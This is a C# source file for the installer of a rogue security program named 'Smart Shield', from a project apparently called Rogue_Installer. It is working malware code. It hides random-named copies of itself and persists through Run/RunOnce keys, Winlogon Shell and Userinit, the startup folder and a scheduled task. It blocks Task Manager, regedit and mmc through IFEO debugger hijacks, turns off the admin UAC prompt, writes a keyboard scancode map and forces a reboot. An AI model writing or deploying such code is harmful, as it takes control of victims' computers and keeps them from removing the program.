using Rogue_Installer.MVVM.ViewModel;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.IO;
using static Rogue_Installer.MVVM.Model.Global;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Rebar;
using System.Diagnostics;
using AdvancedIO;
using Microsoft.Win32;
using static SimplifiedTaskScheduler.SimpleTask;
using System.Timers;
using Rogue_Installer.MVVM.Model;
using thread = System.Threading;
using wsh = IWshRuntimeLibrary;

namespace Rogue_Installer.MVVM.View.Pages
{
    /// <summary>
    /// Interaction logic for InstallerPage.xaml
    /// </summary>
    public partial class InstallerPage : Page
    {
        public static vmInstallerPage _vmInstallerPage { get; } = new vmInstallerPage();
        private Setup _setup;
        private Timer timerTips;
        private static readonly Random rand = new Random();
        public InstallerPage()
        {
            InitializeComponent();
            IsSetupRunning = true;
            DataContext = _vmInstallerPage;
            _setup = new Setup();
            timerTips = new Timer();
        }

        private void Page_Loaded(object sender, RoutedEventArgs e)
        {
            Task.Run(() =>
            {
                _setup.SetupInitialize();
                Application.Current.Dispatcher.Invoke(() =>
                {
                    InstallationCompleted();
                });
            });

            timerTips.Enabled = true;
            timerTips.AutoReset = true;
            timerTips.Interval = 5000;
            timerTips.Elapsed += TimerTips_Elapsed;

            DisplayRandomTip();
        }

        private void InstallationCompleted()
        {
            MainImage.Source = (BitmapImage)FindResource("CheckMark");
            MainImage.Style = (Style)FindResource("CheckMarkAnimation");
            _vmInstallerPage.Instructions = "Now it is safe to restart your computer";
            _vmInstallerPage.AboutProgress = "";

            Task.Run(() =>
            {
                thread.Thread.Sleep(5000);
                Process.Start("shutdown", "/r /f /t 0");
            });
        }

        private void TimerTips_Elapsed(object sender, ElapsedEventArgs e)
        {
            DisplayRandomTip();
        }

        private void DisplayRandomTip()
        {
            _vmInstallerPage.SomeTips = InstallerTips.tips[rand.Next(InstallerTips.tips.Length)];
        }

        private class Setup
        {
            public static string ProductName = "Smart Shield";
            public static string RogueBaseDir = @"C:\Windows\" + ProductName;
            public static string ResourceDir = Path.Combine(RogueBaseDir, "Resources");
            public static string ApplicationPath = Path.Combine(RogueBaseDir, "smart_shield.exe");
            public static string NewApplicationPath = Path.Combine(RogueBaseDir, "Smart Shield.exe");
            public static string ShortCutPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Smart Shield.lnk");
            private Action[] functionPile;
            vmInstallerPage _vmInstallerPage = InstallerPage._vmInstallerPage;

            private static readonly Random rand = new Random();

            public Setup()
            {
                functionPile = new Action[] 
                {
                    ExtractResources,
                    RegistryStartup,
                    StartupDirectory,
                    TaskSchedulerStartup
                };
            }

            public void SetupInitialize()
            {
                double actionOnePercent = 1.0 / functionPile.Length * 100;
                double barValue = 0;

                foreach (var func in functionPile)
                {
                    func();
                    thread.Thread.Sleep(5000);
                    barValue += actionOnePercent;
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        _vmInstallerPage.BarValue = barValue;
                        _vmInstallerPage.BarContent = Math.Round(barValue).ToString() + "%";
                    });
                }
            }

            private void RegistryStartup()
            {
                UpdateAboutProgress("Setting up registry");

                var HKCU = RegistryHive.CurrentUser;
                var HKLM = RegistryHive.LocalMachine;

                RegistryView[] views = { RegistryView.Registry64, RegistryView.Registry32 };
                byte[] scanCode = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,
                    0x00,0x00,0x00,0x53,0xe0,0x00,0x00,0x0f,0x00,0x00,0x00,0x00,0x00};

                foreach (var view in views)
                {
                    RegistrySetValue(HKCU, view, @"Software\Microsoft\Windows\CurrentVersion\Run", MakeRandomString(20), GetAndCreateNewCopy(), RegistryValueKind.String, true, true);
                    RegistrySetValue(HKLM, view, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", MakeRandomString(20), GetAndCreateNewCopy(), RegistryValueKind.String, true, true);
                    RegistrySetValue(HKCU, view, @"Software\Microsoft\Windows\CurrentVersion\RunOnce", MakeRandomString(20), GetAndCreateNewCopy(), RegistryValueKind.String, true, true);
                    RegistrySetValue(HKLM, view, @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", MakeRandomString(20), GetAndCreateNewCopy(), RegistryValueKind.String, true, true);
                    RegistrySetValue(HKLM, view, @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Userinit", GetAndCreateNewCopy(), RegistryValueKind.String, false, true);
                    RegistrySetValue(HKLM, view, @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", GetAndCreateNewCopy(), RegistryValueKind.String, false, true);
                    RegistrySetValue(HKLM, view, @"SYSTEM\CurrentControlSet\Control\Keyboard Layout", "Scancode Map", scanCode, RegistryValueKind.Binary);
                    RegistrySetValue(HKLM, view, @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "AutoRestartShell", 0, RegistryValueKind.DWord);
                    RegistrySetValue(HKLM, view, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
                }

                string[] additionalFiles = {
                @"C:\Windows\regedit.exe",
                @"C:\Windows\System32\taskmgr.exe",
                @"C:\Windows\System32\mmc.exe",
                };

                //Set IFEO for programs above
                foreach (var additional in additionalFiles)
                {
                    RegistrySetValue(HKLM, RegistryView.Registry64, @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + Path.GetFileName(additional), "debugger", GetAndCreateNewCopy(), RegistryValueKind.String);
                }
            }

            private void StartupDirectory()
            {
                UpdateAboutProgress("Adding files into the startup folder");

                string startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string generateNewCopy = GetAndCreateNewCopy();
                string getCopyExeOnly = Path.GetFileName(generateNewCopy);
                string newLocation = Path.Combine(startupDir, getCopyExeOnly);
                File.Copy(generateNewCopy, newLocation);
                File.Delete(generateNewCopy);
                File.SetAttributes(newLocation, FileAttributes.Hidden);
            }

            private void TaskSchedulerStartup()
            {
                UpdateAboutProgress("Scheduling tasks");

                string applicationPath = GetAndCreateNewCopy();
                string taskPath = @"\Microsoft\Windows";

                CreateTaskScheduler(applicationPath, null, taskPath, null);
            }

            private string GetAndCreateNewCopy()
            {
                if (!File.Exists(NewApplicationPath))
                    return "";

                string generateCopyExeName = MakeRandomString(25) + ".exe";
                string getDirectory = ChooseRandomDirectory();
                string copyPath = Path.Combine(getDirectory, generateCopyExeName);

                File.Copy(NewApplicationPath, copyPath, true);
                File.SetAttributes(copyPath, FileAttributes.Hidden);

                return copyPath;
            }

            private string ChooseRandomDirectory()
            {
                string chooseDirectory = "";
                do
                {
                    var getDirNames = Enum.GetValues(typeof(Environment.SpecialFolder));
                    chooseDirectory = Environment.GetFolderPath((Environment.SpecialFolder)getDirNames.GetValue(rand.Next(getDirNames.Length)));

                } while (chooseDirectory.Contains(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
                || string.IsNullOrWhiteSpace(chooseDirectory));

                return chooseDirectory;
            }

            private string MakeRandomString(int range)
            {
                string alphaNumeric = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

                var stringBuilder = new StringBuilder();

                for (int i = 0; i < range; i++)
                {
                    stringBuilder.Append(alphaNumeric[rand.Next(alphaNumeric.Length)]);
                }

                string result = stringBuilder.ToString();

                return result;
            }

            private void RegistrySetValue(RegistryHive hive, RegistryView view, string subKey, 
                string valueName, object data, RegistryValueKind kind, bool overwrite = true, bool hasSpaces = false)
            {
                if (hasSpaces)
                    data = @"""" + data + @"""";

                using (var baseKey = RegistryKey.OpenBaseKey(hive, view))
                {
                    using (var regKey = baseKey.CreateSubKey(subKey))
                    {
                        if (regKey == null)
                            return;

                        if (!overwrite)
                        {
                            object currentData = regKey.GetValue(valueName);

                            if (currentData == null)
                            {
                                regKey.SetValue(valueName, data, kind);
                                return;
                            }

                            if (!currentData.ToString().Contains(','))
                                regKey.SetValue(valueName, currentData + ", " + data, kind);
                            else
                                regKey.SetValue(valueName, currentData + " " + data, kind);
                            return;
                        }

                        regKey.SetValue(valueName, data, kind);
                    }
                }
            }

            private void ExtractResources()
            {
                UpdateAboutProgress("Extracting resources");

                string[] RogueDirs = { RogueBaseDir, ResourceDir };

                foreach (string dir in RogueDirs)
                {
                    if (!Directory.Exists(dir))
                    {
                        Directory.CreateDirectory(dir);
                        File.SetAttributes(dir, FileAttributes.Hidden);
                    }
                }

                if (!Directory.Exists(RogueBaseDir))
                    Directory.CreateDirectory(RogueBaseDir);

                if (!Directory.Exists(ResourceDir))
                    Directory.CreateDirectory(ResourceDir);

                string gResource = Assembly.GetEntryAssembly().GetName().Name + ".g.resources";

                using (var stream = Assembly.GetEntryAssembly().GetManifestResourceStream(gResource))
                {
                    using (var reader = new ResourceReader(stream))
                    {
                        foreach (DictionaryEntry entry in reader)
                        {
                            string resource = (string)entry.Key;

                            if (resource.Contains(".png") || resource.Contains(".exe"))
                            {
                                var uri = new Uri(resourcePack + resource);
                                var streamInfo = Application.GetResourceStream(uri);

                                string fileName = Path.GetFileName(resource);
                                string outputDir = ResourceDir;

                                if (resource.Contains(".exe"))
                                    outputDir = RogueBaseDir;

                                string output = Path.Combine(outputDir, fileName);

                                using (var fileOutput = new FileStream(output, FileMode.Create, FileAccess.ReadWrite))
                                {
                                    streamInfo.Stream.CopyTo(fileOutput);
                                }
                            }
                        }
                    }
                }

                File.Move(ApplicationPath, NewApplicationPath);

                var shell = new wsh.WshShell();
                wsh.IWshShortcut shortcut = (wsh.IWshShortcut)shell.CreateShortcut(ShortCutPath);

                shortcut.TargetPath = NewApplicationPath;
                shortcut.WorkingDirectory = Path.GetDirectoryName(NewApplicationPath);
                shortcut.Description = string.Empty;
                shortcut.IconLocation = NewApplicationPath;
                shortcut.Save();
            }

            private void UpdateAboutProgress(string aboutProgress)
            {
                Application.Current.Dispatcher.Invoke(() =>
                {
                    _vmInstallerPage.AboutProgress = aboutProgress;
                });
            }
        }
    }
}
